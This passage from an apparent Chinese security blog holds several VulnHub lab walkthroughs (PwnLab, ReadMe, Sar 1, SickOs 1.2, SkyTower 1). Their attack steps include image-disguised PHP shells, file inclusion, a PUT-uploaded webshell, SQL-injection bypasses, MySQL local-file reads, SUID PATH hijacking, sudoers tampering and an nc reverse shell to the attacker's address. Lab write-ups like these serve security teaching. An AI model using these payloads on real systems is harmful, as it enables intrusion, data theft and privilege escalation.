&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		echo &quot;Login failed.&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">	?&gt;</span><br><span class="line">	&lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;POST&quot;&gt;</span><br><span class="line">	&lt;label&gt;Username: &lt;&#x2F;label&gt;&lt;input id&#x3D;&quot;user&quot; type&#x3D;&quot;test&quot; name&#x3D;&quot;user&quot;&gt;&lt;br &#x2F;&gt;</span><br><span class="line">	&lt;label&gt;Password: &lt;&#x2F;label&gt;&lt;input id&#x3D;&quot;pass&quot; type&#x3D;&quot;password&quot; name&#x3D;&quot;pass&quot;&gt;&lt;br &#x2F;&gt;</span><br><span class="line">	&lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;Login&quot;&gt;</span><br><span class="line">	&lt;&#x2F;form&gt;</span><br><span class="line">	&lt;?php</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>upload.php</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">if (!isset($_SESSION[&#39;user&#39;])) &#123; die(&#39;You must be log in.&#39;); &#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">	&lt;body&gt;</span><br><span class="line">		&lt;form action&#x3D;&#39;&#39; method&#x3D;&#39;post&#39; enctype&#x3D;&#39;multipart&#x2F;form-data&#39;&gt;</span><br><span class="line">			&lt;input type&#x3D;&#39;file&#39; name&#x3D;&#39;file&#39; id&#x3D;&#39;file&#39; &#x2F;&gt;</span><br><span class="line">			&lt;input type&#x3D;&#39;submit&#39; name&#x3D;&#39;submit&#39; value&#x3D;&#39;Upload&#39;&#x2F;&gt;</span><br><span class="line">		&lt;&#x2F;form&gt;</span><br><span class="line">	&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">if(isset($_POST[&#39;submit&#39;])) &#123;</span><br><span class="line">	if ($_FILES[&#39;file&#39;][&#39;error&#39;] &lt;&#x3D; 0) &#123;</span><br><span class="line">		$filename  &#x3D; $_FILES[&#39;file&#39;][&#39;name&#39;];</span><br><span class="line">		$filetype  &#x3D; $_FILES[&#39;file&#39;][&#39;type&#39;];</span><br><span class="line">		$uploaddir &#x3D; &#39;upload&#x2F;&#39;;</span><br><span class="line">		$file_ext  &#x3D; strrchr($filename, &#39;.&#39;);</span><br><span class="line">		$imageinfo &#x3D; getimagesize($_FILES[&#39;file&#39;][&#39;tmp_name&#39;]);</span><br><span class="line">		$whitelist &#x3D; array(&quot;.jpg&quot;,&quot;.jpeg&quot;,&quot;.gif&quot;,&quot;.png&quot;); </span><br><span class="line"></span><br><span class="line">		if (!(in_array($file_ext, $whitelist))) &#123;</span><br><span class="line">			die(&#39;Not allowed extension, please upload images only.&#39;);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		if(strpos($filetype,&#39;image&#39;) &#x3D;&#x3D;&#x3D; false) &#123;</span><br><span class="line">			die(&#39;Error 001&#39;);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		if($imageinfo[&#39;mime&#39;] !&#x3D; &#39;image&#x2F;gif&#39; &amp;&amp; $imageinfo[&#39;mime&#39;] !&#x3D; &#39;image&#x2F;jpeg&#39; &amp;&amp; $imageinfo[&#39;mime&#39;] !&#x3D; &#39;image&#x2F;jpg&#39;&amp;&amp; $imageinfo[&#39;mime&#39;] !&#x3D; &#39;image&#x2F;png&#39;) &#123;</span><br><span class="line">			die(&#39;Error 002&#39;);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		if(substr_count($filetype, &#39;&#x2F;&#39;)&gt;1)&#123;</span><br><span class="line">			die(&#39;Error 003&#39;);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		$uploadfile &#x3D; $uploaddir . md5(basename($_FILES[&#39;file&#39;][&#39;name&#39;])).$file_ext;</span><br><span class="line"></span><br><span class="line">		if (move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], $uploadfile)) &#123;</span><br><span class="line">			echo &quot;&lt;img src&#x3D;\&quot;&quot;.$uploadfile.&quot;\&quot;&gt;&lt;br &#x2F;&gt;&quot;;</span><br><span class="line">		&#125; else &#123;</span><br><span class="line">			die(&#39;Error 4&#39;);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>可以发现login.php无法sql注入，存在预编译</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$stmt-&gt;bind_param(&#39;ss&#39;, $luser, $lpass);</span><br></pre></td></tr></table></figure>

<p>而upload.php需要登录才能启用</p>
<p>再去包含以下index，看看源码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F;Multilingual. Not implemented yet.</span><br><span class="line">&#x2F;&#x2F;setcookie(&quot;lang&quot;,&quot;en.lang.php&quot;);</span><br><span class="line">if (isset($_COOKIE[&#39;lang&#39;]))</span><br><span class="line">&#123;</span><br><span class="line">	include(&quot;lang&#x2F;&quot;.$_COOKIE[&#39;lang&#39;]);</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F; Not implemented yet.</span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;PwnLab Intranet Image Hosting&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;img src&#x3D;&quot;images&#x2F;pwnlab.png&quot;&gt;&lt;br &#x2F;&gt;</span><br><span class="line">[ &lt;a href&#x3D;&quot;&#x2F;&quot;&gt;Home&lt;&#x2F;a&gt; ] [ &lt;a href&#x3D;&quot;?page&#x3D;login&quot;&gt;Login&lt;&#x2F;a&gt; ] [ &lt;a href&#x3D;&quot;?page&#x3D;upload&quot;&gt;Upload&lt;&#x2F;a&gt; ]</span><br><span class="line">&lt;hr&#x2F;&gt;&lt;br&#x2F;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">	if (isset($_GET[&#39;page&#39;]))</span><br><span class="line">	&#123;</span><br><span class="line">		include($_GET[&#39;page&#39;].&quot;.php&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		echo &quot;Use this server to upload and share image files inside the intranet&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;center&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>可以发现page确实存在LFI，需要截断才能进一步利用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (isset($_GET[&#39;page&#39;]))</span><br><span class="line">&#123;</span><br><span class="line">	include($_GET[&#39;page&#39;].&quot;.php&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这时发现，login.php require了一个config.php，dirbuster也发现了它，查看源码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$server	  &#x3D; &quot;localhost&quot;;</span><br><span class="line">$username &#x3D; &quot;root&quot;;</span><br><span class="line">$password &#x3D; &quot;H4u%QJ_H99&quot;;</span><br><span class="line">$database &#x3D; &quot;Users&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>得到了mysql的登录凭据，我们可以直接登录对方的3306端口</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql -u root -h 192.168.1.206 -pH4u%QJ_H99</span><br></pre></td></tr></table></figure>

<p><img src="/images/PwnLab/8png.png" alt="8png"></p>
<p>找到了一些信息，使用凭证登录web应用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kent&#x2F;JWzXuBJJNy</span><br></pre></td></tr></table></figure>

<p>登陆后就能使用upload.php了</p>
<p><img src="/images/PwnLab/9.png"></p>
<p>审计前upload.php前，先知道我们手上有一个LFI，但是后缀必须为.php。而upload.php使用了白名单，这点我们无法绕过，所以这个LFI失效了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$whitelist &#x3D; array(&quot;.jpg&quot;,&quot;.jpeg&quot;,&quot;.gif&quot;,&quot;.png&quot;); </span><br></pre></td></tr></table></figure>

<p>检查content-type必须有image</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if(strpos($filetype,&#39;image&#39;) &#x3D;&#x3D;&#x3D; false) &#123;</span><br><span class="line">	die(&#39;Error 001&#39;);</span><br></pre></td></tr></table></figure>

<p>验证MIME类型</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if($imageinfo[&#39;mime&#39;] !&#x3D; &#39;image&#x2F;gif&#39; &amp;&amp; $imageinfo[&#39;mime&#39;] !&#x3D; &#39;image&#x2F;jpeg&#39; &amp;&amp; $imageinfo[&#39;mime&#39;] !&#x3D; &#39;image&#x2F;jpg&#39;&amp;&amp; $imageinfo[&#39;mime&#39;] !&#x3D; &#39;image&#x2F;png&#39;) &#123;</span><br><span class="line">	die(&#39;Error 002&#39;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上传的图片会移动到/upload目录下，并会修改文件名</p>
<p>这样想直接触发shell就别想了，上传的一定是一个图片马，需要LFI触发<br>这个时候发现了index.php的一段代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (isset($_COOKIE[&#39;lang&#39;]))</span><br><span class="line">&#123;</span><br><span class="line">	include(&quot;lang&#x2F;&quot;.$_COOKIE[&#39;lang&#39;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里include了我们可控的cookie，这样我们就可以满足get shell的条件了</p>
<p>我们先bypass一下上传</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">修改文件后缀为.gif</span><br><span class="line">文件开头为	GIF8&lt;?php</span><br></pre></td></tr></table></figure>

<p>制作头部</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &#39;47 49 46 38&#39; | xxd -p -r &gt;magicgif.gif</span><br><span class="line">cat test.gif &gt;&gt; magicgif.gif </span><br></pre></td></tr></table></figure>

<p><img src="/images/PwnLab/20.png" alt="20"></p>
<p><img src="/images/PwnLab/10.png" alt="10"></p>
<p>之后发送给index.php一个构造的cookie，让他包含<code>lang/../upload/恶意文件.jpg</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -v --cookie &quot;lang&#x3D;..&#x2F;upload&#x2F;b1a99ebaad4dd28f57517de36e770484.gif&quot; http:&#x2F;&#x2F;192.168.1.206&#x2F;index.php</span><br></pre></td></tr></table></figure>

<p><img src="/images/PwnLab/11.png" alt="11"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>首先检查/etc/passwd发现了数据里的用户名，尝试切换用户</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kane&#x2F;iSv5Ym2GRo</span><br></pre></td></tr></table></figure>

<p>这里kane是可以切换的</p>
<p><img src="/images/PwnLab/12.png" alt="12"></p>
<p>winpeas发现了有趣SUID文件，直接执行试试</p>
<p><img src="/images/PwnLab/13.png" alt="13"></p>
<p>看起来它通过环境变量调用了cat命令查看了一个什么文件，这文件还不存在</p>
<p>strings简单分析</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">strings msgmike</span><br></pre></td></tr></table></figure>

<p><img src="/images/PwnLab/14.png" alt="14"></p>
<p>果然有这条命令，而且这里的SUID是mIke</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ls -l msgmike                                                                                                                                                                       </span><br><span class="line">-rwsr-sr-x 1 mike mike 5148 Mar 17  2016 msgmike  </span><br></pre></td></tr></table></figure>

<p>这和某考试的著名机器很像，我们可以通过控制环境变量，替换同名文件，来控制它的行为</p>
<p>我们现在kali上创建一个文件evil.c</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">int main ( int argc, char *argv[] )</span><br><span class="line">&#123;</span><br><span class="line">        setreuid(0,0);</span><br><span class="line">        execve(&quot;&#x2F;bin&#x2F;sh&quot;, NULL, NULL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接着到目标机器上传输这个文件，并编译，保存名称为cat</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc evil.c -o cat -m32</span><br></pre></td></tr></table></figure>

<p>测试执行以下，看能不能进入/bin/sh</p>
<p><img src="/images/PwnLab/16.png" alt="16"></p>
<p>修改文件权限777，之后修改环境变量</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chmod 777 cat</span><br><span class="line">export PATH&#x3D;&#x2F;tmp</span><br></pre></td></tr></table></figure>

<p>陷阱已经搭建好了，只需要猎物主动运行即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;home&#x2F;kane&#x2F;msgmike</span><br></pre></td></tr></table></figure>

<p><img src="/images/PwnLab/15.png" alt="15"></p>
<p>这样，程序以SUID运行msgmike，并通过环境变量，运行了假的cat(这里为调用/bin/sh)，从而让执行者(我)进入了SUID的/bin/sh</p>
<p>进入成功别忘了还原</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export PATH&#x3D;&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;bin:&#x2F;bin:&#x2F;usr&#x2F;local&#x2F;games:&#x2F;usr&#x2F;games</span><br></pre></td></tr></table></figure>

<p>之后再次linpeas枚举</p>
<p>这次在家发现了SUID文件，而且拥有者是root</p>
<p><img src="/images/PwnLab/17.png" alt="17"></p>
<p>这里就简单尝试几个常见的命令注入，很快就可以有所发现</p>
<p><img src="/images/PwnLab/18.png" alt="18"></p>
<p>最后的命令注入payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1;&#x2F;bin&#x2F;bash$IFS-p</span><br></pre></td></tr></table></figure>

<p><img src="/images/PwnLab/19.png" alt="19"></p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场ReadMe</title>
    <url>/2020/09/27/%E9%9D%B6%E5%9C%BAReadMe/</url>
    <content><![CDATA[<h1 id="ReadMe"><a href="#ReadMe" class="headerlink" title="ReadMe"></a>ReadMe</h1><p>发现80端口并进行目录枚举</p>
<p>发现</p>
<ul>
<li><code>/info.php</code>：phpinfo页面</li>
<li><code>/reminder.php</code>：发现了文件的路径提示</li>
<li><code>/adminer.php</code>：CMS Adminer 4.4.0</li>
</ul>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>直接搜索Adminer的公开漏洞，只发现了SSRF，这里没什么用</p>
<p>首先确认Adminer的功能，应该是一个数据库连接的图形化web页面</p>
<p><img src="/images/Readme/7.png" alt="7"></p>
<p>通过phpinfo页面，发现了一些线索</p>
<p><code>mysqli.allow_local_infile</code>处于开启，说明也许通过<code>load data infile</code>来进行文件读取</p>
<p><img src="/images/Readme/6.png" alt="6"></p>
<p><code>openbasedir</code>无限制，说明可以读取任意文件</p>
<p><img src="/images/Readme/3.png" alt="3"></p>
<p>现在来创建利用所需要的条件</p>
<p>kali启动mysql</p>
<p>创建用户，赋予权限，允许远程登录(%表示任意ip登录)，刷新权限，创库建表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE DATABASE adminer;</span><br><span class="line">CREATE USER &#39;demo&#39;@&#39;%&#39; IDENTIFIED BY &#39;demo_admirer&#39;;</span><br><span class="line">GRANT ALL PRIVILEGES ON * . * TO &#39;demo&#39;@&#39;%&#39;;</span><br><span class="line">FLUSH PRIVILEGES;</span><br><span class="line">use adminer;</span><br><span class="line">create table test(data VARCHAR(255));</span><br></pre></td></tr></table></figure>


<p>本地数据库开启<code>local_infile</code>，ON说明开启</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SET GLOBAL local_infile &#x3D; true;</span><br><span class="line">SHOW GLOBAL VARIABLES LIKE &#39;local_infile&#39;;</span><br></pre></td></tr></table></figure>

<p>编辑<code>/etc/mysql/mariadb.conf.d/50-server.cnf</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bind-address      &#x3D;0.0.0.0</span><br></pre></td></tr></table></figure>

<p>验证登录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql -h localhost -u demo -pdemo_admirer</span><br></pre></td></tr></table></figure>

<p>这样前期准备工作就已经完成了</p>
<p>到web页面输入连接的信息，跳转到下面的页面</p>
<p><img src="/images/Readme/1.png" alt="1"></p>
<p>注意到左边显示了存在的表(test)，并允许我们执行sql语句，我们跳转到执行语句的页面，执行如下sql语句</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">load data local infile &#39;&#x2F;etc&#x2F;passwd&#39;</span><br><span class="line">into table test</span><br><span class="line">fields terminated by &quot;&#x2F;n&quot;</span><br></pre></td></tr></table></figure>

<p>回去查看test表，发现数据已经被写入</p>
<p><img src="/images/Readme/2.png" alt="2"></p>
<p>为了看起来方便，我们可以删掉表中的记录，重新来插别的文件内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">delete from test where 1&#x3D;1;</span><br></pre></td></tr></table></figure>

<p>现在去读之前页面提示的重要文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">load data local infile &#39;&#x2F;etc&#x2F;julian.txt&#39; into table test fields terminated by &quot;&#x2F;n&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Readme/4.png" alt="4"></p>
<p>发现了登录凭据</p>
<p>直接ssh过去</p>
<p><img src="/images/Readme/5.png" alt="5"></p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场Sar 1</title>
    <url>/2020/09/20/%E9%9D%B6%E5%9C%BASar-1/</url>
    <content><![CDATA[<h1 id="Sar-1"><a href="#Sar-1" class="headerlink" title="Sar 1"></a>Sar 1</h1><p>kali:192.168.1.201<br>目标:192.168.1.222</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">masscan -p1-65535 192.168.1.222 --rate&#x3D;1000 -e eth0 &gt; ports</span><br><span class="line">ports&#x3D;$(cat ports | awk -F &quot; &quot; &#39;&#123;print $4&#125;&#39; | awk -F &quot;&#x2F;&quot; &#39;&#123;print $1&#125;&#39; | sort -n | tr &#39;\n&#39; &#39;,&#39; | sed &#39;s&#x2F;,$&#x2F;&#x2F;&#39;)</span><br><span class="line">nmap -Pn -sV -sC -p$ports 192.168.1.222 -oN nmap</span><br></pre></td></tr></table></figure>
<p><img src="/images/Sar-1/1.png" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>访问目标robots.txt发现了路径</p>
<p><img src="/images/Sar-1/2.png" alt="2"></p>
<p>目标存在phpinfo.php</p>
<p><img src="/images/Sar-1/3.png" alt="3"></p>
<p>访问/sar2HTML/发现了sar2html 3.2.1</p>
<p><img src="/images/Sar-1/4.png" alt="4"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>寻找公开漏洞可以发现RCE漏洞</p>
<p><img src="/images/Sar-1/5.png" alt="5"></p>
<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p>但是先别急，因为首页有一处非常显眼的文件上传点，我们不经任何处理，直接上传.php的shell，提示文件上传成功<br>现在需要找到这个文件的位置，这种CMS，建议直接去看官方文档或者找github看看源码</p>
<p>在github上，没有从源码的文件夹中直接找到upload字样的位置，但是在下方发现了一些提示性的文件夹</p>
<p><img src="/images/Sar-1/6.png" alt="6"></p>
<p>访问过去</p>
<p><img src="/images/Sar-1/7.png" alt="7"></p>
<p>发现了shell</p>
<p><img src="/images/Sar-1/8.png" alt="8"></p>
<h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><p>尝试RCE，根据文档进行操作</p>
<p><img src="/images/Sar-1/9.png" alt="9"></p>
<p>这个RCE的回显处不在页面内，可以在DOM里看到，可以确认RCE成功</p>
<p><img src="/images/Sar-1/10.png" alt="10"></p>
<p>两种方法都能获取shell</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>发现<code>/var/spool/cron/crontabs</code>可以写，但是这貌似不能给我们提权，没有发现<code>/var/spool/cron/root</code>这样的文件</p>
<p>计划任务枚举发现了信息</p>
<p><img src="/images/Sar-1/11.png" alt="11"></p>
<p>过去查看</p>
<p><img src="/images/Sar-1/12.png" alt="12"></p>
<p>提权看上去没有难度，只是套娃了而已</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &#39;rm -rf &#x2F;tmp&#x2F;f;mknod &#x2F;tmp&#x2F;f p;&#x2F;bin&#x2F;sh 0&lt;&#x2F;tmp&#x2F;f | nc 192.168.1.201 53 1&gt;&#x2F;tmp&#x2F;f&#39; &gt;&gt;write.sh</span><br></pre></td></tr></table></figure>

<p><img src="/images/Sar-1/13.png" alt="13"></p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场SickOs 1.2</title>
    <url>/2020/09/13/%E9%9D%B6%E5%9C%BASickOs-1-2/</url>
    <content><![CDATA[<h1 id="SickOs-1-2"><a href="#SickOs-1-2" class="headerlink" title="SickOs 1.2"></a>SickOs 1.2</h1><p>kali:192.168.1.201</p>
<p>目标:192.168.1.218</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">masscan -p1-65535 192.168.1.218 --rate&#x3D;1000 -e eth0 &gt; ports</span><br><span class="line">ports&#x3D;$(cat ports | awk -F &quot; &quot; &#39;&#123;print $4&#125;&#39; | awk -F &quot;&#x2F;&quot; &#39;&#123;print $1&#125;&#39; | sort -n | tr &#39;\n&#39; &#39;,&#39; | sed &#39;s&#x2F;,$&#x2F;&#x2F;&#39;)</span><br><span class="line">nmap -Pn -sV -sC -p$ports 192.168.1.218 -oN nmap</span><br></pre></td></tr></table></figure>

<p><img src="/images/SickOs-1.2/1.png" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>手动访问80端口，页面没啥信息<br>目录扫描</p>
<p><img src="/images/SickOs-1.2/2.png" alt="2"></p>
<p>发现目录/test/</p>
<p>在这之后就没有其他发现了</p>
<p>我们可以发现该页面是要一个目录，联想到有关目录的操作，枚举对方支持的HTTP方法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -v -X OPTIONS http:&#x2F;&#x2F;192.168.1.218&#x2F;test&#x2F;</span><br></pre></td></tr></table></figure>

<p><img src="/images/SickOs-1.2/3.png" alt="3"></p>
<p>发现可以使用put</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>也许我们能够使用put方法直接获取shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -v -X PUT -d &#39;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#39; http:&#x2F;&#x2F;192.168.1.218&#x2F;test&#x2F;shell.php</span><br></pre></td></tr></table></figure>

<p><img src="/images/SickOs-1.2/4.png" alt="4"></p>
<p>这样我们可以直接反弹shell</p>
<p><img src="/images/SickOs-1.2/5.png" alt="5"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www-data@ubuntu:&#x2F;tmp$ uname -i    </span><br><span class="line">i386</span><br></pre></td></tr></table></figure>

<p>目标为32位</p>
<p>linpeas扫描</p>
<p><img src="/images/SickOs-1.2/6.png" alt="6"></p>
<p>pspy32扫描</p>
<p><img src="/images/SickOs-1.2/7.png" alt="7"></p>
<p>发现了chkrootkit，利用它来提权 参考33899.txt</p>
<p><img src="/images/SickOs-1.2/9.png" alt="9"></p>
<p>等待执行</p>
<p><img src="/images/SickOs-1.2/8.png" alt="8"></p>
<p>或者sudoers提权</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &#39;chmod 777 &#x2F;etc&#x2F;sudoers &amp;&amp; echo &quot;www-data ALL&#x3D;NOPASSWD: ALL&quot; &gt;&gt; &#x2F;etc&#x2F;sudoers &amp;&amp; chmod 440 &#x2F;etc&#x2F;sudoers&#39; &gt; &#x2F;tmp&#x2F;update</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场SkyTower 1</title>
    <url>/2020/09/14/%E9%9D%B6%E5%9C%BASkyTower-1/</url>
    <content><![CDATA[<h1 id="SkyTower-1"><a href="#SkyTower-1" class="headerlink" title="SkyTower 1"></a>SkyTower 1</h1><p>kali:192.168.1.201</p>
<p>目标:192.168.1.239</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">masscan -p1-65535 192.168.1.239 --rate&#x3D;1000 -e eth0 &gt; ports</span><br><span class="line">ports&#x3D;$(cat ports | awk -F &quot; &quot; &#39;&#123;print $4&#125;&#39; | awk -F &quot;&#x2F;&quot; &#39;&#123;print $1&#125;&#39; | sort -n | tr &#39;\n&#39; &#39;,&#39; | sed &#39;s&#x2F;,$&#x2F;&#x2F;&#39;)</span><br><span class="line">nmap -Pn -sV -sC -p$ports 192.168.1.239 -oN nmap</span><br></pre></td></tr></table></figure>

<p><img src="/images/SkyTower-1/1.png" alt="1"></p>
<p>发现了http服务和http代理服务</p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>针对80口开始枚举</p>
<p>dirbuster并没有扫出太多的信息，它的主页是一个登录页面</p>
<p><img src="/images/SkyTower-1/2.png" alt="2"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>在登陆出输入sql注入符号，尝试触发错误</p>
<p><img src="/images/SkyTower-1/3.png" alt="3"></p>
<p>得到了错误语句，看来是容易收到SQL注入攻击的</p>
<p>尝试payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39; or 1&#x3D;1#</span><br></pre></td></tr></table></figure>

<p>得到了错误回显</p>
<p><img src="/images/SkyTower-1/4.png" alt="4"></p>
<p>这是一个重要的信息，发现or疑似被过滤</p>
<p>尝试其他绕过符号，如and、|、&amp;</p>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39; || 1&#x3D;1#</span><br></pre></td></tr></table></figure>

<p>这次payload生效</p>
<p>得到了另一个信息</p>
<p><img src="/images/SkyTower-1/5.png" alt="5"></p>
<p>看起来可以登录到某个位置，想到之前并没有扫到SSH开放，猜测或许需要使用对方的代理</p>
<p>proxychains添加对方的http代理</p>
<p><img src="/images/SkyTower-1/6.png" alt="6"></p>
<p>nmap扫描</p>
<p><img src="/images/SkyTower-1/7.png" alt="7"></p>
<p>发现22开启，尝试登录</p>
<p><img src="/images/SkyTower-1/8.png" alt="8"></p>
<p>失败，但是得到了一个提示<br>既然如此我们可以尝试一些对于Rshell的绕过技巧或者直接尝试ssh执行命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">proxychains ssh john@127.0.0.1 -t &quot;&#x2F;bin&#x2F;sh&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">proxychains ssh john@127.0.0.1 whoami</span><br><span class="line">john</span><br><span class="line"></span><br><span class="line">proxychains ssh john@127.0.0.1 &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>

<p>这样我们就有shell了</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>现在就有问题，虽然获得了shell，但不是TTY，机器上没有python没法生成伪tty</p>
<p>这里我们希望可以修改<code>.bashrc</code>，来修改删除掉限制</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">case $- in</span><br><span class="line">    *i*) ;;</span><br><span class="line">      *) return;;</span><br><span class="line">esac</span><br></pre></td></tr></table></figure>

<p>但是这里有R权限，我们不能编辑，但我们可以直接删掉它</p>
<p>这样退出再登录，不需要任何参数，就可以获得全交互的shell了</p>
<p><img src="/images/SkyTower-1/9.png" alt="9"></p>
<p>既然刚刚是通过sql注入进来的，那么可以去看mysql的配置</p>
<p><img src="/images/SkyTower-1/10.png" alt="10"></p>
